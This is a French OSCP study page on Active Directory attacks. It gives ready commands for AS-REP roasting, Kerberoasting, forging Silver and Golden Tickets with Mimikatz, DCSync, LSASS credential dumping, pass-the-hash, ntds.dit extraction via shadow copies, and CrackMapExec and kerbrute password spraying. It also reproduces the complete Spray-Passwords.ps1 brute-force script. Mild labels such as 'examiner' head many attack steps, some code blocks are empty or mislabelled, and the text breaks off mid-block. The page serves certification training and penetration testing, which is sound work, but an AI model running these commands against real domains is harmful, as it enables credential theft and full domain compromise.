---
title: "OSCP · Active Directory : techniques"
description: "Étudier les mécanismes d'authentification et les techniques AD."
---

# OSCP · Active Directory : techniques

Étudier les mécanismes d'authentification et les techniques AD.


## AS-REP Roasting


<p class="oscp-command-note">Analyser des empreintes avec John.</p>

```bash
John the Ripper

```


<p class="oscp-command-note">Énumérer les utilisateurs du domaine.</p>

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth

```


<p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>

```powershell
Rubeus.exe asreproast

# L'option /nowrap empêche la sortie d'être enveloppée à la ligne suivante, vous permettant de voir la totalité de la sortie sur une seule ligne sans interruption
Rubeus.exe asreproast /nowrap

```


<p class="oscp-command-note">Examiner les comptes sans préauthentification Kerberos.</p>

```bash
# Depuis Kali (GetNPUsers.py)
impacket-GetNPUsers -dc-ip [dc-ip] -request -outputfile [output_file].asreproast [domain.com]/[user]

# Depuis Windows
GetNPUsers.py domain/[user]:[password]@[dc-ip] -no-pass

```


<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>

```bash
hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt

```



### Repérer les comptes sans préauthentification

Examiner le bit DONT_REQ_PREAUTH via LDAP, sans demander de ticket.

<p class="oscp-command-note">Repérer les comptes sans préauthentification.</p>

```bash
ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' dn sAMAccountName
```

## Kerberoasting


<p class="oscp-command-note">Énumérer les SPN des comptes de service.</p>

```powershell
GetUserSPNs.py domain/[user]:[password]@[dc-ip]

```




```bash
# Depuis Kali
sudo impacket-GetUserSPNs -request -dc-ip [dc-ip] [domain.com]/[user]
# Autre possibilité
sudo impacket-GetUserSPNs -request -dc-ip [dc_ip] [domain.com]/[user] -hashes [LMHASH]:[NTHASH] -outputfile [output_file]

# Depuis Windows
GetUserSPNs.py domain/[user]:[password]@[dc-ip] -request

```


<p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>

```powershell
Rubeus.exe kerberoast
# Autre possibilité
Rubeus.exe kerberoast /outfile:[output_file].kerberoast

```


<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>

```bash
hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt

```



### Inventaire des SPN de comptes utilisateur

Rechercher les comptes de service ayant un SPN à partir de LDAP, sans extraire de tickets.

<p class="oscp-command-note">Inventaire des SPN de comptes utilisateur.</p>

```bash
ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName
```

## Faux tickets de service (Silver Tickets)


<p class="oscp-command-note">Énumérer les utilisateurs du domaine.</p>

```powershell
# 1. Trouvez le [ServiceAccountName]
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
# Autre possibilité
Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName

# 2. Extract the NTLM hash
mimikatz # lsadump::lsa /inject /name:[ServiceAccountName]

# Exemple :
mimikatz # lsadump::dcsync /user:HTTP/server01

```


<p class="oscp-command-note">Script PowerShell pour créer un faux ticket de service (Silver Ticket).</p>

```powershell
# 1. Trouver le domaine SID
(Get-ADDomain).DomainSID
# Autre possibilité
whoami /user

# 2. Trouvez le serveur cible (mon serveur DC)
Get-ADDomainController -Filter *
# Autre possibilité
netdom query dc

# 3. Créer le Ticket Argent, par exemple dans ce cas /service:CIFS (pour aider à décider le /service, cochez Section 12.11)
mimikatz # kerberos::golden /domain:[domain.com] /sid:[domainSID] /target:[targetserver] /rc4:[NTLMHash] /service:[serviceName] /user:[username]

# Exemple :
mimikatz # kerberos::golden /sid:S-1-5-21-1863423273-656352785-1243762498 /domain:example.com /ptt /target:server01.example.com /service:http /rc4:4d28cf5252d39971462580a51484ca09 /user:testUser

```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # kerberos::ptt silver_ticket.kirbi

# Confirmer l'existence du ticket
klist

```


<p class="oscp-command-note">Lister les fichiers du répertoire.</p>

```bash
dir \\targetserver\sharedfolder

```


## Faux tickets TGT (Golden Tickets)


**Paramètres et repères :**
`Mimikatz`  


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # lsadump::dcsync /domain:[domain.com] /user:krbtgt

```


<p class="oscp-command-note">Script PowerShell pour créer un faux ticket TGT (Golden Ticket).</p>

```powershell
# 1. Trouver le domaine SID
(Get-ADDomain).DomainSID
# Autre possibilité
whoami /user

# 2. Trouvez le RID: Le RID pour le compte Administrateur est de 500, mais d'autres comptes auront des RID différents. Vous pouvez trouver le RID d'un utilisateur spécifique en utilisant des outils comme Mimikatz ou en interrogeant Active Directory.
PowerShell -Command "(New-Object System.Security.Principal.NTAccount('domain\ServiceAccount')).Translate([System.Security.Principal.SecurityIdentifier]).Value"

# 3. Créer le ticket
mimikatz # kerberos::golden /user:[DesiredUsername] /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:[DesiredRID]
# Autre possibilité
mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:500

```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # kerberos::ptt golden_ticket.kirbi

# Confirmer l'existence du ticket
klist

```


<p class="oscp-command-note">Examiner les comptes ou ressources Windows.</p>

```bash
net use \\domaincontroller\C$ /user:[DesiredUsername]

```


## Réplication Active Directory avec DCSync

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>

```powershell
Get-ADGroupMember -Identity "Domain Admins"

```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```powershell
# Depuis Kali
impacket-secretsdump [domain.com]/[adminUser]:"[password]"@[dc-ip]
# ou; l'utilisateur -just-dc-user [targetUser] ne doit extraire que les hachages de l'utilisateur indiqué et pas tous les DC.
impacket-secretsdump -just-dc-user [targetUser] [domain.com]/[adminUser]:"[password]"@[dc-ip]

# Depuis Windows
mimikatz # lsadump::dcsync /domain:[domain.com]
# ou ; ici nous extrayons simplement l'utilisateur spécifié.
mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]

```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # lsadump::dcsync /domain:[domain.com]

```


```powershell
# Vous pouvez rediriger la sortie vers un fichier pour analyse :
mimikatz # lsadump::dcsync /domain:domain.com > output.txt

```


<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>

```bash
hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt

```


## Identifiants AD en cache

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::logonpasswords

mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::tickets
mimikatz # sekurlsa::credman
mimikatz # sekurlsa::msv
mimikatz # sekurlsa::tspkg
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::kerberos
mimikatz # sekurlsa::ssp

mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::lsa /inject
mimikatz # lsadump::trust
mimikatz # lsadump::cache

```


<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>

```bash
hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt

```


## Authentification NTLM

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ntlm_authentication.png)


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # sekurlsa::logonpasswords

```


```powershell
mimikatz # sekurlsa::pth /user:[username] /domain:[domain.com] /ntlm:[NTLMhash]

```


<p class="oscp-command-note">Lister les fichiers du répertoire.</p>

```bash
dir \\targetserver\sharedfolder

```


## Authentification Kerberos

Examiner les objets, les droits et les services du domaine.

![Descripción de la imagen](https://www.emmanuelsolis.com/img/kerberos_authentication.jpg)


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # sekurlsa::tickets /export

```


```powershell
mimikatz # kerberos::ptt TGT_ticket.kirbi

```


<p class="oscp-command-note">Lister les fichiers du répertoire.</p>

```bash
dir \\targetserver\sharedfolder

```


#### Exécuter le script


<p class="oscp-command-note">Script PowerShell dans la rubrique « Exécuter le script ».</p>

```powershell
# -Pass nous permet d'utiliser un seul mot de passe pour tester.
# Nous pourrions également ajouter l'option -File pour utiliser une liste de mots de passe personnalisée.
# -Admin option est pour ajouter un test pour compte admin.
.\Spray-Passwords.ps1 -Pass [password] -Admin

```


#### Code source du script


<p class="oscp-command-note">Script PowerShell dans la rubrique « Code source of the Script ».</p>

```powershell
<#
  .SYNOPSIS
    PoC PowerShell script to demo how to perform password spraying attacks against
     user accounts in Active Directory (AD), aka low and slow online brute force method.
    Only use for good and after written approval from AD owner.
    Requires access to a Windows host on the internal network, which may perform
     queries against the Primary Domain Controller (PDC).
    Does not require admin access, neither in AD or on Windows host.
    Remote Server Administration Tools (RSAT) are not required.

    Should NOT be considered OPSEC safe since:
    - a lot of traffic is generated between the host and the Domain Controller(s).
    - failed logon events will be massive on Domain Controller(s).
    - badpwdcount will iterate on user account objects in scope.

    No accounts should be locked out by this script alone, but there are no guarantees.
    NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.
  .DESCRIPTION
    Perform password spraying attack against user accounts in Active Directory.
  .PARAMETER Pass
    Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'. Do not use together with File or Url."

  .PARAMETER File
    Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.

  .PARAMETER Url
    Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.

  .PARAMETER Admins
    Warning: will also target privileged user accounts (admincount=1.)". Default = $false.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016'
    1. Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins
    1. Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose

    1. Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).
    2. Output script progress/status information to console.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt' -Verbose

    1. Download the password file with weak passwords.
    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).
    3. Output script progress/status information to console.
  .LINK
    Get latest version here: https://github.com/ZilentJack/Spray-Passwords
  .NOTES
    Authored by    : Jakob H. Heidelberg / @JakobHeidelberg / www.improsec.com
    Together with  : CyberKeel / www.cyberkeel.com
    Date created   : 09/05-2016
    Last modified  : 26/06-2016
    Version history:
    - 1.00: Initial public release, 26/06-2016
    Tested on:
     - WS 2016 TP5
     - WS 2012 R2
     - Windows 10
    Known Issues & possible solutions/workarounds:
     KI-0001: -
       Solution: -
    Change Requests for vNext (not prioritized):
     CR-0001: Support for Fine-Grained Password Policies (FGPP).
     CR-0002: Find better way of getting Default Domain Password Policy than "NET ACCOUNTS". Get-ADDefaultDomainPasswordPolicy is not en option as it relies on RSAT.
     CR-0003: Threated approach to test more user/password combinations simultaneously.
     CR-0004: Exception or include list based on username, group membership, SID's or the like.
     CR-0005: Exclude user account that executes the script (password probably already known).
    Verbose output:
     Use -Verbose to output script progress/status information to console.
#>

[CmdletBinding(DefaultParameterSetName='ByPass')]
Param
(
    [Parameter(Mandatory = $true, ParameterSetName = 'ByURL',HelpMessage="Download file from given URL and use as password input file to test multiple passwords for each targeted user account.")]
    [String]
    $Url = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByFile',HelpMessage="Supply a path to a password input file to test multiple passwords for each targeted user account.")]
    [String]
    $File = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByPass',HelpMessage="Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'")]
    [AllowEmptyString()]
    [String]
    $Pass = '',

    [Parameter(Mandatory = $false,HelpMessage="Warning: will also target privileged user accounts (admincount=1.)")]
    [Switch]
    $Admins = $false

)

# Method to determine if input is numeric or not
Function isNumeric ($x) {
    $x2 = 0
    $isNum = [System.Int32]::TryParse($x, [ref]$x2)
    Return $isNum
}

# Method to get the lockout threshold - does not take FGPP into acocunt
Function Get-threshold
{
    $data = net accounts
    $threshold = $data[5].Split(":")[1].Trim()

    If (isNumeric($threshold) )
        {
            Write-Verbose "threshold is a number = $threshold"
            $threshold = [Int]$threshold
        }
    Else
        {
            Write-Verbose "Threshold is probably 'Never', setting max to 1000..."
            $threshold = [Int]1000
        }

    Return $threshold
}

# Method to get the lockout observation window - does not tage FGPP into account
Function Get-Duration
{
    $data = net accounts
    $duration = [Int]$data[7].Split(":")[1].Trim()
    Write-Verbose "Lockout duration is = $duration"
    Return $duration
}

# Méthode pour récupérer les objets utilisateurs du PDC
Function Get-UserObjects
{
    # Obtenez des informations sur le domaine actuel
    Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
    Catch {Write-Verbose "No domain found, will quit..." ; Exit}

    # Obtenez le DC avec le rôle d'émulateur PDC
    $PDC = ($domainObj.PdcRoleOwner).Name

    # Construire la chaîne de recherche à partir de laquelle les utilisateurs doivent être trouvés
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName

    # Créer un chercheur d'annuaire pour le sondage sur le DC
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain

    # Select properties to load, to speed things up a bit
    $Searcher.PropertiesToLoad.Add("samaccountname") > $Null
    $Searcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $Searcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    # Rechercher uniquement les utilisateurs activés qui ne sont pas verrouillés - éviter les admins sauf si $admins = $true
    If ($Admins) {$Searcher.filter="(&(samAccountType=805306368)(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    Else {$Searcher.filter="(&(samAccountType=805306368)(!(admincount=1))(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    $Searcher.PageSize = 1000

    # Trouver et retourner des comptes utilisateurs ciblés
    $userObjs = $Searcher.FindAll()
    Return $userObjs
}

# Méthode de test d'auth avec nom d'utilisateur et mot de passe spécifiques
Function Perform-Authenticate
{
    Param
    ([String]$username,[String]$password)

    # Obtenez le domaine actuel avec ADSI
    $CurrentDomain = "LDAP://"+([ADSI]"").DistinguishedName

    # Essayez d'authentifier
    Write-Verbose "Trying to authenticate as user '$username' with password '$password'"
    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
    $res = $dom.Name

    # Return true/false
    If ($res -eq $null) {Return $false}
    Else {Return $true}
}

# Valider et analyser l'utilisateur fourni url au fichier CSV de mots de passe
Function Parse-Url
{
    Param ([String]$url)

    # Télécharger le fichier de mot de passe depuis URL
    $data = (New-Object System.Net.WebClient).DownloadString($url)
    $data = $data.Split([environment]::NewLine)

    # Parse passwords file and return results
    If ($data -eq $null -or $data -eq "") {Return $null}
    $passwords = $data.Split(",").Trim()
    Return $passwords
}

# Valider et analyser l'utilisateur fourni fichier CSV de mots de passe
Function Parse-File
{
   Param ([String]$file)

   If (Test-Path $file)
   {
        $data = Get-Content $file

        If ($data -eq $null -or $data -eq "") {Return $null}
        $passwords = $data.Split(",").Trim()
        Return $passwords
   }
   Else {Return $null}
}

# Main function to perform the actual brute force attack
Function BruteForce
{
   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)

   #Setup variables
   $userObj = Get-UserObjects
   Write-Verbose "Found $(($userObj).count) active & unlocked users..."

   If ($passwords.Length -gt $threshold)
   {
        $time = ($passwords.Length - $threshold) * $duration
        Write-Host "Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes."
   }

   [Boolean[]]$done = @()
   [Boolean[]]$usersCracked = @()
   [Int[]]$numTry = @()
   $results = @()

   #Initialize arrays
   For ($i = 0; $i -lt $userObj.Length; $i += 1)
   {
        $done += $false
        $usersCracked += $false
        $numTry += 0
   }

   # Main while loop which does the actual brute force.
   Write-Host "Performing brute force - press [q] to stop the process and print results..." -BackgroundColor Yellow -ForegroundColor Black
   :Main While ($true)
   {
        # Obtenir des comptes utilisateurs
        $userObj = Get-UserObjects

        # Iterate over every user in AD
        For ($i = 0; $i -lt $userObj.Length; $i += 1)
        {

            # Permettre l'arrêt manuel de la boucle tout en conservant les résultats obtenus
            If ($Host.UI.RawUI.KeyAvailable -and ("q" -eq $Host.UI.RawUI.ReadKey("IncludeKeyUp,NoEcho").Character))
            {
                Write-Host "Stopping bruteforce now...." -Background DarkRed
                Break Main
            }

            If ($usersCracked[$i] -eq $false)
            {
                If ($done[$i] -eq $false)
                {
                    # Put object values into variables
                    $samaccountnname = $userObj[$i].Properties.samaccountname
                    $badpwdcount = $userObj[$i].Properties.badpwdcount[0]
                    $badpwdtime = $userObj[$i].Properties.badpasswordtime[0]

                    # Not yet reached lockout tries
                    If ($badpwdcount -lt ($threshold - 1))
                    {
                        # Essayez l'auth avec le mot de passe actuel
                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                        If ($auth -eq $true)
                        {
                            Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                            $results += $samaccountnname
                            $results += $passwords[$numTry[$i]]
                            $usersCracked[$i] = $true
                            $done[$i] = $true
                        }

                        # Auth essayer n'a pas fonctionné, aller au mot de passe suivant dans la liste
                        Else
                        {
                            $numTry[$i] += 1
                            If ($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                        }
                    }

                    # One more tries would result in lockout, unless timer has expired, let's see...
                    Else
                    {
                        $now = Get-Date

                        If ($badpwdtime)
                        {
                            $then = [DateTime]::FromFileTime($badpwdtime)
                            $timediff = ($now - $then).TotalMinutes

                            If ($timediff -gt $duration)
                            {
                                # Since observation window time has passed, another auth try may be performed
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }

                            } # Time-diff if

                        }
                        Else
                        {
                            # Verbose-log if $badpwdtime in null. Possible "Cannot index into a null array" error.
                            Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"


                                   # Essayez l'auth avec le mot de passe actuel
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }


                        } # Badpwdtime-check if

                    } # Badwpdcount-check if

                } # Done-check if

            } # User-cracked if

        } # User loop

        # Vérifiez si la force brute est faite ainsi la boucle peut être terminée
        $amount = 0
        For ($j = 0; $j -lt $done.Length; $j += 1)
        {
            If ($done[$j] -eq $true) {$amount += 1}
        }

        If ($amount -eq $done.Length) {Break}

   # Take a nap for a second
   Start-Sleep -m 1000

   } # Main While loop

   If ($results.Length -gt 0)
   {
       Write-Host "Users guessed are:"
       For($i = 0; $i -lt $results.Length; $i += 2) {Write-Host " '$($results[$i])' with password: '$($results[$i + 1])'"}
   }
   Else {Write-Host "No passwords were guessed."}
}

$passwords = $null

If ($Url -ne '')
{
    $passwords = Parse-Url $Url
}
ElseIf($File -ne '')
{
    $passwords = Parse-File $File
}
Else
{
    $passwords = $Pass.Split(",").Trim()
}

If($passwords -eq $null)
{
    Write-Host "Error in password input, please try again."
    Exit
}

# Obtenez des informations sur la politique de mot de passe
$duration = Get-Duration
$threshold = Get-threshold

If ($Admins) {Write-Host "WARNING: also targeting admin accounts." -BackgroundColor DarkRed}

# Appeler la fonction principale et démarrer la force brute
BruteForce $duration $threshold $passwords

```


### Authentification avec DirectoryEntry


**Paramètres et repères :**
`System.DirectoryServices`  


<p class="oscp-command-note">Script PowerShell pour l’authentification avec DirectoryEntry.</p>

```powershell
# Fetch the current domain object
$domainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Identifier le contrôleur de domaine primaire (PDC) du domaine
$primaryDC = ($domainContext.PdcRoleOwner).Name

# Construire le chemin LDAP pour l'accès au répertoire
$ldapPath = "LDAP://"
$ldapPath += $primaryDC + "/"

# Construire le nom distingué (DN) pour la structure du domaine
$domainDN = "DC=$($domainContext.Name.Replace('.', ',DC='))"
$ldapPath += $domainDN

# Authentifier le service d'annuaire avec des références spécifiques
$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, "[userName]", "[password]")

```


#### Commandes de base


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --continue-on-success
# Autre possibilité
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --password-spray
# Autre possibilité
crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com]

```


```bash
# Vérifier l'accès SMB
crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com] --kerberos

```


```bash
# Vérifier l'accès SMB
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --signing

```


**Paramètres et repères :**
`--continue-on-error`  




```bash
# Vérifier l'accès SMB
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --continue-on-error

```


#### Commandes complémentaires


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --shares

```


```bash
# Vérifier l'accès SMB
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --smbv1

```


```bash
# Lister les sessions SMB
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --sessions

```


```bash
# Vérifier l'accès SMB
crackmapexec smb [ip/domain] -u Administrator -p '[AdminPassword]!' -d [domain.com] --sam

```


```bash
# Vérifier l'accès SMB
crackmapexec smb [ip/domain] -u [userName] -p '[password]!' -d [domain.com] --exec-command "[command]"

```


#### Services pouvant être vérifiés


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec rdp [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]

```


```bash
# Vérifier l'accès WinRM
crackmapexec winrm [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec http [ip/domain] -u [userName] -p '[password]'

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec ftp [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec telnet [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec smtp [ip/domain] -u [users_file].txt -p '[password]'

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec dns [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]

```


```bash
# Vérifier l'accès LDAP
crackmapexec ldap [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec netbios [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec mysql [ip/domain] -u [users_file].txt -p '[password]'

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec postgres [ip/domain] -u [users_file].txt -p '[password]'

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec mssql [ip/domain] -u [users_file].txt -p '[password]'

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec oracle [ip/domain] -u [users_file].txt -p '[password]'

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec redis [ip/domain] -u [users_file].txt -p '[password]'

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec docker [ip/domain] -u [users_file].txt -p '[password]'

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec snmp [ip/domain] -u [users_file].txt -p '[password]'

```


```bash
# Examiner le service avec CrackMapExec
crackmapexec ntp [ip/domain]

```


### Utilisation de kerbrute




```powershell
# L'exécutable se trouve dans le kerbrute GitHub (lien dans la section 18.3.2.2).
.\kerbrute_windows_amd64.exe passwordspray -d [domain.com] .\[usernames_file].txt "[password]"

```



### Afficher les tickets Kerberos courants

Sur Windows, klist permet d'examiner les tickets déjà présents dans la session sans les exporter.

<p class="oscp-command-note">Afficher les tickets Kerberos courants.</p>

```powershell
klist tickets
klist sessions
```

### Diagnostiquer l'heure d'un système Linux

Kerberos exige une synchronisation cohérente ; vérifier l'état des services de temps avant d'enquêter sur une erreur de ticket.

<p class="oscp-command-note">Diagnostiquer l'heure d'un système Linux.</p>

```bash
timedatectl show -p NTPSynchronized -p TimeUSec
```

## Copies instantanées (Shadow Copies)




```powershell
# -p X: this indicates which disk we wanto to copy, usually is C.
vshadow.exe -nw -p C:

```


**Paramètres et repères :**
`C:`  


<p class="oscp-command-note">Script PowerShell dans la rubrique « Shadow Copies ».</p>

```powershell
# Remplacer X par le numéro de copie d'ombre, trouvé dans la commande précédente
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit C:\desired\backup\path\ntds.dit.bak

# Exemple
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

```




```powershell
reg.exe save hklm\system C:\backup_path\system.bak

# Exemple
C:\> reg.exe save hklm\system c:\system.bak

```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```bash
impacket-secretsdump -ntds [ntds_file] -system [system_file] LOCAL

# Exemple
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # lsadump::ntds /ntds:"[ntds_file]" /system:"[system_file]"

```




```powershell
vssadmin list shadows

```




```powershell
# Remplacer X par le numéro de copie d'ombre.
mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX

```


<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\ShadowCopy</code></p>


<p class="oscp-command-note">Lister les fichiers du répertoire.</p>

```powershell
dir C:\ShadowCopy

```


## Délégation contrainte Kerberos


<p class="oscp-command-note">Énumérer les ordinateurs du domaine.</p>

```powershell
Get-ADComputer -Filter {ServicePrincipalName -like "*"} -Property ServicePrincipalName | Select-Object Name,ServicePrincipalName

```


```powershell
# Lister les comptes du domaine
Get-ADUser -Identity <ServiceAccount> -Properties msDS-AllowedToDelegateTo

```




```bash
kinit <ServiceAccount>

```


### Outils essentiels d'énumération


**Paramètres et repères :**
`CrackMapExec` · `rpcclient` · `smbclient` · `BloodHound`  
`Impacket` · `Responder` · `PowerView`  


### Méthode d'énumération et de vérification des identifiants

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`nmap`  


<p class="oscp-command-note">Identifier les versions des services.</p>

```bash
nmap -p 88,135,139,389,445,5985,636,3268 -sC -sV -Pn [IP]

```


**Paramètres et repères :**
`CrackMapExec`  


### Tableau de référence des ports

Vérifier les ports et les services de la cible autorisée.


**88**

Kerberos · Authentication service for AD.


**135**

MSRPC · Microsoft RPC.


**139**

NetBIOS · File/printer sharing.


**389**

LDAP · Directory services.


**445**

SMB · File sharing/admin shares.


**636**

LDAPS · Secure LDAP.


**3268**

LDAP GC · LDAP Global Catalog.


**3389**

RDP · Remote Desktop Protocol.


**5985**

WinRM · Windows Remote Management.


### Techniques complémentaires d’énumération


<p class="oscp-command-note">Observer les requêtes de résolution de noms.</p>

```bash
responder -I eth0

```


**Paramètres et repères :**
`secretsdump.py`  


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```bash
# Same tool as impacket-secretsdump
